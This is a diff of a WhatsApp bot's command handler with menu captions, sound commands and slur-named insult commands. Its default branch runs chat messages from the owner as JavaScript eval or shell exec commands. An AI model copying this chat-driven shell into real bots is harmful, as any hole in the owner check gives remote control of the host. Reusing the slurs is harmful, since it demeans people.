+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `⬇️ DOWNLOAD	
+🔖• ${prefix}tiktok [url]
+🔖• ${prefix}tiktokaudio[url]
+🔖• ${prefix}mediafire [url]
+🔖• ${prefix}ytmp3 [url|quality]
+🔖• ${prefix}ytmp4 [url|quality]
+🔖• ${prefix}gitclone [repo link]
+🔖• ${prefix}soundcloud [url]
+🔖• ${prefix}zippyshare [url]
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+            case 'searchmenu':{
+var unicorn = await getBuffer(picak+'Search Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🔎 SEARCH	
+🔖• ${prefix}play [query]
+🔖• ${prefix}song [query]
+🔖• ${prefix}yts [query]
+🔖• ${prefix}lyrics [query]
+🔖• ${prefix}google [query]
+🔖• ${prefix}gimage [query]
+🔖• ${prefix}pinterest [query]
+🔖• ${prefix}image [query]
+🔖• ${prefix}film [query]
+🔖• ${prefix}wallpaper [query]
+🔖• ${prefix}searchgc [query]
+🔖• ${prefix}happymod [query]
+🔖• ${prefix}servermc
+🔖• ${prefix}mcpedl [query]
+🔖• ${prefix}tvsearch [query]
+🔖• ${prefix}wikimedia [query]
+🔖• ${prefix}ytsearch [query]
+🔖• ${prefix}ringtone [query]
+🔖• ${prefix}wattpad [query]
+🔖•  ${prefix}mcserver [ip|port]
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+            case 'convertmenu':{
+var unicorn = await getBuffer(picak+'Convert Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `♾️ CONVERT	
+🔖•  ${prefix}toimage [reply stick]
+🔖•  ${prefix}sticker [reply img|gif]
+🔖•  ${prefix}take [reply img|gif|stik]
+🔖•  ${prefix}smeme [reply img]
+🔖•  ${prefix}emoji [emoji]
+🔖•  ${prefix}tovideo [reply img]
+🔖•  ${prefix}togif [reply stick]
+🔖•  ${prefix}tourl [reply img]
+🔖•  ${prefix}tovn [reply aud]
+🔖•  ${prefix}tomp3 [reply vn]
+🔖•  ${prefix}toaudio [reply vid]
+🔖•  ${prefix}ebinary [reply txt]
+🔖•  ${prefix}dbinary [reply txt]
+🔖•  ${prefix}tinyurl [link]
+🔖•  ${prefix}styletext [text]
+🔖• ${prefix}volume [reply aud]
+🔖• ${prefix}bass [reply aud]
+🔖• ${prefix}blown [reply aud]
+🔖• ${prefix}deep [reply aud]
+🔖• ${prefix}earrape [reply aud]
+🔖• ${prefix}fast [reply aud]
+🔖• ${prefix}fat [reply aud]
+🔖• ${prefix}nightcore [reply aud]
+🔖• ${prefix}reverse [reply aud]
+🔖• ${prefix}robot [reply aud]
+🔖• ${prefix}slow [reply aud]
+🔖• ${prefix}squirrel [reply aud]
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+case 'randomimagemenu':{
+var unicorn = await getBuffer(picak+'Random Image Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🎠 RANDOM IMG 	
+🔖• ${prefix}coffee
+🔖• ${prefix}woof
+🔖• ${prefix}meow
+🔖• ${prefix}lizard
+🔖• ${prefix}wallneon
+🔖• ${prefix}wallpubg
+🔖• ${prefix}wallml
+🔖• ${prefix}wallrandom
+🔖• ${prefix}wallcode
+🔖• ${prefix}animewall [query]
+🔖• ${prefix}animewall2 [query]
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+           case 'emotemenu':{
+var unicorn = await getBuffer(picak+'Emote Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🐣 EMOTE	
+🔖• ${prefix}instagramemoji
+🔖• ${prefix}facebookemoji
+🔖• ${prefix}iphoneemoji
+🔖• ${prefix}samsungemoji
+🔖• ${prefix}joyemoji
+🔖• ${prefix}skypeemoji
+🔖• ${prefix}twitteremoji
+🔖• ${prefix}whatsappemoji
+🔖• ${prefix}microsoftemoji
+🔖• ${prefix}googleemoji
+🔖• ${prefix}pediaemoji
+🔖• ${prefix}microsoftemoji
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+            case 'imageeffectmenu':{
+var unicorn = await getBuffer(picak+'Image Effect Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🎈 IMG EFFECT 	
+🔖• ${prefix}wanted [reply img]
+🔖• ${prefix}triggeredwebp [reply img]
+🔖• ${prefix}removebg [reply img]
+🔖• ${prefix}upscaler [reply img]
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+case 'animemenu':{
+var unicorn = await getBuffer(picak+'Anime Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `👾 ANIME 	
+🔖• ${prefix}asuna
+🔖• ${prefix}anna
+🔖• ${prefix}chitoge
+🔖• ${prefix}cosplay
+🔖• ${prefix}elaina
+🔖• ${prefix}emilia
+🔖• ${prefix}gremory
+🔖• ${prefix}kaguya
+🔖• ${prefix}kotori
+🔖• ${prefix}kurumi
+🔖• ${prefix}mikasa
+🔖• ${prefix}rize
+🔖• ${prefix}naruto
+🔖• ${prefix}yaoi
+🔖• ${prefix}animeneko
+🔖• ${prefix}waifu
+🔖• ${prefix}shinobu
+🔖• ${prefix}animeawoo
+🔖• ${prefix}animewaifu
+🔖• ${prefix}foxgirl
+🔖• ${prefix}animenom
+🔖• ${prefix}goose
+🔖• ${prefix}8ball
+🔖• ${prefix}avatar
+🔖• ${prefix}tickle
+🔖• ${prefix}gecg
+🔖• ${prefix}feed
+🔖• ${prefix}animeslap
+🔖• ${prefix}animepat
+🔖• ${prefix}animeneko
+🔖• ${prefix}animekiss
+🔖• ${prefix}animewlp
+🔖• ${prefix}animecuddle
+🔖• ${prefix}animecry
+🔖• ${prefix}animekill
+🔖• ${prefix}animelick
+🔖• ${prefix}animebite
+🔖• ${prefix}animeyeet
+🔖• ${prefix}animebully
+🔖• ${prefix}animebonk
+🔖• ${prefix}animewink
+🔖• ${prefix}animepoke
+👨??‍💻• ${prefix}animesmile
+🔖• ${prefix}animewave
+🔖• ${prefix}animeawoo
+🔖• ${prefix}animeblush
+🔖• ${prefix}animesmug
+🔖• ${prefix}animeglomp
+🔖• ${prefix}animehappy
+🔖• ${prefix}animedance
+🔖• ${prefix}animecringe
+🔖• ${prefix}animehighfive
+🔖• ${prefix}animehandhold
+🔖• ${prefix}animemegumin
+🔖• ${prefix}animemegumin
+🔖• ${prefix}animesmug
+🔖• ${prefix}loli-waifu
+🔖• ${prefix}couplepp
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+            case 'stickermenu':{
+var unicorn = await getBuffer(picak+'Sticker Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🧚🏻‍♂️ STICKER	
+🔖•  ${prefix}patrick
+🔖•  ${prefix}emoji
+🔖•  ${prefix}emojimix
+🔖•  ${prefix}attp
+🔖•  ${prefix}ttp
+🔖•  ${prefix}doge
+🔖•  ${prefix}lovesticker
+🔖•  ${prefix}animestick
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+case 'animestickermenu':{
+var unicorn = await getBuffer(picak+'Anime Sticker Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🧚🏻‍♀️  ANIME STICKER	
+🔖• ${prefix}loli
+🔖• ${prefix}bully
+🔖• ${prefix}cuddle
+🔖• ${prefix}cry
+🔖• ${prefix}hug
+🔖• ${prefix}awoo
+🔖• ${prefix}kiss
+🔖• ${prefix}lick
+🔖• ${prefix}pat
+🔖• ${prefix}smug
+🔖• ${prefix}bonk
+🔖• ${prefix}yeet
+🔖• ${prefix}blush
+🔖• ${prefix}smile
+🔖• ${prefix}wave
+🔖• ${prefix}highfive
+🔖• ${prefix}handhold
+🔖• ${prefix}nom
+🔖• ${prefix}glomp
+🔖• ${prefix}bite
+🔖• ${prefix}slap
+🔖• ${prefix}kill
+🔖• ${prefix}happy
+🔖• ${prefix}wink
+🔖• ${prefix}poke
+🔖• ${prefix}dance
+🔖• ${prefix}cringe
+🔖• ${prefix}neko
+🔖• ${prefix}gura
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+case 'nsfwmenu':{
+var unicorn = await getBuffer(picak+'Nsfw Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🕵🏻‍♂️ NSFW 	
+🔖• ${prefix}hentaivideo
+🔖• ${prefix}hneko
+🔖• ${prefix}nwaifu
+🔖• ${prefix}animespank
+🔖• ${prefix}trap
+🔖• ${prefix}gasm
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+case 'funmenu':{
+var unicorn = await getBuffer(picak+'Fun Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🎠	
+🔖•  ${prefix}how [text
+🔖•  ${prefix}when [text]
+🔖•  ${prefix}where [text]
+🔖•  ${prefix}is [text]
+🔖•  ${prefix}what [text]
+🔖•  ${prefix}can [text]
+🔖•  ${prefix}rate [text]
+🔖•  ${prefix}beautifulcheck [tag]
+🔖•  ${prefix}awesomecheck [tag]
+🔖•  ${prefix}prettycheck [tag]
+🔖•  ${prefix}lesbiancheck [tag]
+🔖•  ${prefix}gaycheck [tag]
+🔖•  ${prefix}cutecheck [tag]
+🔖•  ${prefix}uglycheck [tag]
+🔖•  ${prefix}hornycheck [tag]
+🔖•  ${prefix}charactercheck [tag]
+🔖•  ${prefix}lovelycheck [tag]
+🔖•  ${prefix}couple
+🔖•  ${prefix}mysoulmate
+🔖•  ${prefix}hot
+🔖•  ${prefix}sexy
+🔖•  ${prefix}kind
+🔖•  ${prefix}idiot
+🔖•  ${prefix}handsome
+🔖•  ${prefix}beautiful
+🔖•  ${prefix}cute
+🔖•  ${prefix}pretty
+🔖•  ${prefix}lesbian
+🔖•  ${prefix}noob
+🔖•  ${prefix}bastard
+🔖•  ${prefix}foolish
+🔖•  ${prefix}nerd
+🔖•  ${prefix}asshole
+🔖•  ${prefix}gay
+🔖•  ${prefix}smart
+🔖•  ${prefix}stubble
+🔖•  ${prefix}dog
+🔖•  ${prefix}horny
+🔖•  ${prefix}cunt
+🔖•  ${prefix}wibu
+🔖•  ${prefix}noobra
+🔖•  ${prefix}nibba
+🔖•  ${prefix}nibbi
+🔖•  ${prefix}comrade
+🔖•  ${prefix}mumu
+🔖•  ${prefix}rascal
+🔖•  ${prefix}scumbag
+🔖•  ${prefix}nuts
+🔖•  ${prefix}fagot
+🔖•  ${prefix}scoundrel
+🔖•  ${prefix}ditch
+🔖•  ${prefix}dope
+🔖•  ${prefix}gucci
+🔖•  ${prefix}lit
+🔖•  ${prefix}dumbass
+🔖•  ${prefix}crackhead
+🔖•  ${prefix}mf
+🔖•  ${prefix}motherfucker
+🔖•  ${prefix}sucker
+🔖•  ${prefix}fuckboy
+🔖•  ${prefix}playboy
+🔖•  ${prefix}fuckgirl
+🔖•  ${prefix}playgirl
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+case 'soundmenu':{
+var unicorn = await getBuffer(picak+'Sound Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🎧 Sound 
+🔖•  ${prefix}sound1
+🔖•  ${prefix}sound2
+🔖•  ${prefix}sound3
+🔖•  ${prefix}sound4
+🔖•  ${prefix}sound5
+🔖•  ${prefix}sound6
+🔖•  ${prefix}sound7
+🔖•  ${prefix}sound8
+🔖•  ${prefix}sound9
+🔖•  ${prefix}sound10
+🔖•  ${prefix}sound11
+🔖•  ${prefix}sound12
+🔖•  ${prefix}sound13
+🔖•  ${prefix}sound14
+🔖•  ${prefix}sound15
+🔖•  ${prefix}sound16
+🔖•  ${prefix}sound17
+🔖•  ${prefix}sound18
+🔖•  ${prefix}sound19
+🔖•  ${prefix}sound20
+🔖•  ${prefix}sound21
+🔖•  ${prefix}sound22
+🔖•  ${prefix}sound23
+🔖•  ${prefix}sound24
+🔖•  ${prefix}sound25
+🔖•  ${prefix}sound26
+🔖•  ${prefix}sound27
+🔖•  ${prefix}sound28
+🔖•  ${prefix}sound29
+🔖•  ${prefix}sound30
+🔖•  ${prefix}sound31
+🔖•  ${prefix}sound32
+🔖•  ${prefix}sound33
+🔖•  ${prefix}sound34
+🔖•  ${prefix}sound35
+🔖•  ${prefix}sound36
+🔖•  ${prefix}sound37
+🔖•  ${prefix}sound38
+🔖•  ${prefix}sound39
+🔖•  ${prefix}sound40
+🔖•  ${prefix}sound41
+🔖•  ${prefix}sound42
+🔖•  ${prefix}sound43
+🔖•  ${prefix}sound44
+🔖•  ${prefix}sound45
+🔖•  ${prefix}sound46
+🔖•  ${prefix}sound47
+🔖•  ${prefix}sound48
+🔖•  ${prefix}sound49
+🔖•  ${prefix}sound50
+🔖•  ${prefix}sound51
+🔖•  ${prefix}sound52
+🔖•  ${prefix}sound53
+🔖•  ${prefix}sound54
+🔖•  ${prefix}sound55
+🔖•  ${prefix}sound56
+🔖•  ${prefix}sound57
+🔖•  ${prefix}sound58
+🔖•  ${prefix}sound59
+🔖•  ${prefix}sound60
+🔖•  ${prefix}sound61
+🔖•  ${prefix}sound62
+🔖•  ${prefix}sound63
+🔖•  ${prefix}sound64
+🔖•  ${prefix}sound65
+🔖•  ${prefix}sound66
+🔖•  ${prefix}sound67
+🔖•  ${prefix}sound68
+🔖•  ${prefix}sound69
+🔖•  ${prefix}sound70
+🔖•  ${prefix}sound71
+🔖•  ${prefix}sound72
+🔖•  ${prefix}sound73
+🔖•  ${prefix}sound74
+🔖•  ${prefix}sound75
+🔖•  ${prefix}sound76
+🔖•  ${prefix}sound77
+🔖•  ${prefix}sound78
+🔖•  ${prefix}sound79
+🔖•  ${prefix}sound80
+🔖•  ${prefix}sound81
+🔖•  ${prefix}sound82
+🔖•  ${prefix}sound83
+🔖•  ${prefix}sound84
+🔖•  ${prefix}sound85
+🔖•  ${prefix}sound86
+🔖•  ${prefix}sound87
+🔖•  ${prefix}sound88
+🔖•  ${prefix}sound89
+🔖•  ${prefix}sound90
+🔖•  ${prefix}sound91
+🔖•  ${prefix}sound92
+👨??‍💻•  ${prefix}sound93
+👨??‍💻•  ${prefix}sound94
+🔖•  ${prefix}sound95
+🔖•  ${prefix}sound96
+🔖•  ${prefix}sound97
+🔖•  ${prefix}sound98
+🔖•  ${prefix}sound99
+🔖•  ${prefix}sound100
+🔖•  ${prefix}sound101
+🔖•  ${prefix}sound102
+🔖•  ${prefix}sound103
+🔖•  ${prefix}sound104
+🔖•  ${prefix}sound105
+🔖•  ${prefix}sound106
+🔖•  ${prefix}sound107
+🔖•  ${prefix}sound108
+🔖•  ${prefix}sound109
+🔖•  ${prefix}sound110
+🔖•  ${prefix}sound111
+🔖•  ${prefix}sound112
+🔖•  ${prefix}sound113
+🔖•  ${prefix}sound114
+??•  ${prefix}sound115
+🔖•  ${prefix}sound116
+🔖•  ${prefix}sound117
+??•  ${prefix}sound118
+🔖•  ${prefix}sound119
+🔖•  ${prefix}sound120
+🔖•  ${prefix}sound121
+🔖•  ${prefix}sound122
+🔖•  ${prefix}sound123
+🔖•  ${prefix}sound124
+🔖•  ${prefix}sound125
+🔖•  ${prefix}sound126
+🔖•  ${prefix}sound127
+🔖•  ${prefix}sound128
+🔖•  ${prefix}sound129
+🔖•  ${prefix}sound130
+🔖•  ${prefix}sound131
+🔖•  ${prefix}sound132
+🔖•  ${prefix}sound133
+🔖•  ${prefix}sound134
+🔖•  ${prefix}sound135
+🔖•  ${prefix}sound136
+🔖•  ${prefix}sound137
+🔖•  ${prefix}sound138
+🔖•  ${prefix}sound139
+🔖•  ${prefix}sound140
+🔖•  ${prefix}sound141
+🔖•  ${prefix}sound142
+🔖•  ${prefix}sound143
+🔖•  ${prefix}sound144
+🔖•  ${prefix}sound145
+🔖•  ${prefix}sound146
+🔖•  ${prefix}sound147
+🔖•  ${prefix}sound148
+🔖•  ${prefix}sound149
+🔖•  ${prefix}sound150
+🔖•  ${prefix}sound151
+🔖•  ${prefix}sound152
+🔖•  ${prefix}sound153
+🔖•  ${prefix}sound154
+🔖•  ${prefix}sound155
+🔖•  ${prefix}sound156
+🔖•  ${prefix}sound157
+🔖•  ${prefix}sound158
+🔖•  ${prefix}sound159
+🔖•  ${prefix}sound160
+🔖•  ${prefix}sound161
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+case 'gamemenu':{
+var unicorn = await getBuffer(picak+'Game Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🦄 GAME	
+🔖•  ${prefix}truth
+🔖•  ${prefix}dare
+🔖•  ${prefix}tictactoe
+🔖•  ${prefix}delttt
+🔖•  ${prefix}guess [option]
+🔖•  ${prefix}math [mode]
+🔖•  ${prefix}suitpvp [tag]
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+            case 'anonymousmenu':{
+var unicorn = await getBuffer(picak+'Anonymous Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `👤 ANONYMOUS 
+🔖• ${prefix}anonymous
+🔖• ${prefix}start
+🔖• ${prefix}next
+🔖• ${prefix}leave
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+case 'databasemenu':{
+var unicorn = await getBuffer(picak+'Database Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `📂 DATABASE 
+🔖•  ${prefix}setcmd
+🔖•  ${prefix}listcmd
+🔖•  ${prefix}delcmd
+🔖•  ${prefix}lockcmd
+🔖•  ${prefix}addmsg
+🔖•  ${prefix}listmsg
+🔖•  ${prefix}getmsg
+🔖•  ${prefix}delmsg
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+case 'othermenu':{
+var unicorn = await getBuffer(picak+'Other Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🥷🏻 OTHER 	
+🔖•  ${prefix}afk
+🔖•  ${prefix}id
+🔖•  ${prefix}toqr [link]
+🔖•  ${prefix}repeat
+🔖•  ${prefix}readmore [text]
+🔖•  ${prefix}toviewonce
+🔖•  ${prefix}fliptext [text]] 
+🔖•  ${prefix}alive
+🔖•  ${prefix}script
+🔖•  ${prefix}speedtest
+🔖•  ${prefix}ping
+🔖•  ${prefix}owner
+🔖•  ${prefix}menu
+🔖•  ${prefix}delete
+🔖•  ${prefix}chatinfo
+🔖•  ${prefix}quoted
+🔖•  ${prefix}listpc
+🔖•  ${prefix}listgc
+🔖•  ${prefix}donate
+🔖•  ${prefix}request
+🔖•  ${prefix}report [bug]
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+            case 'sound1':
+case 'sound2':
+case 'sound3':
+case 'sound4':
+case 'sound5':
+case 'sound6':
+case 'sound7':
+case 'sound8':
+case 'sound9':
+case 'sound10':
+case 'sound11':
+case 'sound12':
+case 'sound13':
+case 'sound14':
+case 'sound15':
+case 'sound16':
+case 'sound17':
+case 'sound18':
+case 'sound19':
+case 'sound20':
+case 'sound21':
+case 'sound22':
+case 'sound23':
+case 'sound24':
+case 'sound25':
+case 'sound26':
+case 'sound27':
+case 'sound28':
+case 'sound29':
+case 'sound30':
+case 'sound31':
+case 'sound32':
+case 'sound33':
+case 'sound34':
+case 'sound35':
+case 'sound36':
+case 'sound37':
+case 'sound38':
+case 'sound39':
+case 'sound40':
+case 'sound41':
+case 'sound42':
+case 'sound43':
+case 'sound44':
+case 'sound45':
+case 'sound46':
+case 'sound47':
+case 'sound48':
+case 'sound49':
+case 'sound50':
+case 'sound51':
+case 'sound52':
+case 'sound53':
+case 'sound54':
+case 'sound55':
+case 'sound56':
+case 'sound57':
+case 'sound58':
+case 'sound59':
+case 'sound60':
+case 'sound61':
+case 'sound62':
+case 'sound63':
+case 'sound64':
+case 'sound65':
+case 'sound66':
+case 'sound67':
+case 'sound68':
+case 'sound69':
+case 'sound70':
+case 'sound71':
+case 'sound72':
+case 'sound73':
+case 'sound74':
+case 'sound75':
+case 'sound76':
+case 'sound77':
+case 'sound78':
+case 'sound79':
+case 'sound80':
+case 'sound81':
+case 'sound82':
+case 'sound83':
+case 'sound84':
+case 'sound85':
+case 'sound86':
+case 'sound87':
+case 'sound88':
+case 'sound89':
+case 'sound90':
+case 'sound91':
+case 'sound92':
+case 'sound93':
+case 'sound94':
+case 'sound95':
+case 'sound96':
+case 'sound97':
+case 'sound98':
+case 'sound99':
+case 'sound100':
+case 'sound101':
+case 'sound102':
+case 'sound103':
+case 'sound104':
+case 'sound105':
+case 'sound106':
+case 'sound107':
+case 'sound108':
+case 'sound109':
+case 'sound110':
+case 'sound111':
+case 'sound112':
+case 'sound113':
+case 'sound114':
+case 'sound115':
+case 'sound116':
+case 'sound117':
+case 'sound118':
+case 'sound119':
+case 'sound120':
+case 'sound121':
+case 'sound122':
+case 'sound123':
+case 'sound124':
+case 'sound125':
+case 'sound126':
+case 'sound127':
+case 'sound128':
+case 'sound129':
+case 'sound130':
+case 'sound131':
+case 'sound132':
+case 'sound133':
+case 'sound134':
+case 'sound135':
+case 'sound136':
+case 'sound137':
+case 'sound138':
+case 'sound139':
+case 'sound140':
+case 'sound141':
+case 'sound142':
+case 'sound143':
+case 'sound144':
+case 'sound145':
+case 'sound146':
+case 'sound147':
+case 'sound148':
+case 'sound149':
+case 'sound150':
+case 'sound151':
+case 'sound152':
+case 'sound153':
+case 'sound154':
+case 'sound155':
+case 'sound156':
+case 'sound157':
+case 'sound158':
+case 'sound159':
+case 'sound160':
+case 'sound161':
+x_tiktok = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
+await XeonBotInc.sendMessage(m.chat, { audio: x_tiktok, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
+break
+            default:
+                if (budy.startsWith('=>')) {
+                    if (!isCreator) return m.reply(mess.owner)
+                    function Return(sul) {
+                        sat = JSON.stringify(sul, null, 2)
+                        bang = util.format(sat)
+                            if (sat == undefined) {
+                                bang = util.format(sul)
+                            }
+                            return m.reply(bang)
+                    }
+                    try {
+                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
+                    } catch (e) {
+                        m.reply(String(e))
+                    }
+                }
+
+                if (budy.startsWith('>')) {
+                    if (!isCreator) return m.reply(mess.owner)
+                    try {
+                        let evaled = await eval(budy.slice(2))
+                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+                        await m.reply(evaled)
+                    } catch (err) {
+                        await m.reply(String(err))
+                    }
+                }
+
+                if (budy.startsWith('$')) {
+                    if (!isCreator) return m.reply(mess.owner)
+                    exec(budy.slice(2), (err, stdout) => {
+                        if(err) return m.reply(err)
+                        if (stdout) return m.reply(stdout)
+                    })
+                }
+			
+		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
+                    this.anonymous = this.anonymous ? this.anonymous : {}
+                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
+                    if (room) {
+                        if (/^.*(next|leave|start)/.test(m.text)) return
+                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
+                        let other = [room.a, room.b].find(user => user !== m.sender)
+                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
+                            contextInfo: {
+                                ...m.msg.contextInfo,
+                                forwardingScore: 0,
+                                isForwarded: true,
+                                participant: other
+                            }
+                        } : {})
+                    }
+                    return !0
+                }
+			
+		if (isCmd && budy.toLowerCase() != undefined) {
+		    if (m.chat.endsWith('broadcast')) return
+		    if (m.isBaileys) return
+		    let msgs = global.db.data.database
+		    if (!(budy.toLowerCase() in msgs)) return
+		    XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
+		}
+        }
+        
+
+    } catch (err) {
+        m.reply(util.format(err))
+    }
+}
+
+
+let file = require.resolve(__filename)
+fs.watchFile(file, () => {
+	fs.unwatchFile(file)
+	console.log(chalk.redBright(`Update ${__filename}`))
+	delete require.cache[file]
+	require(file)
+})
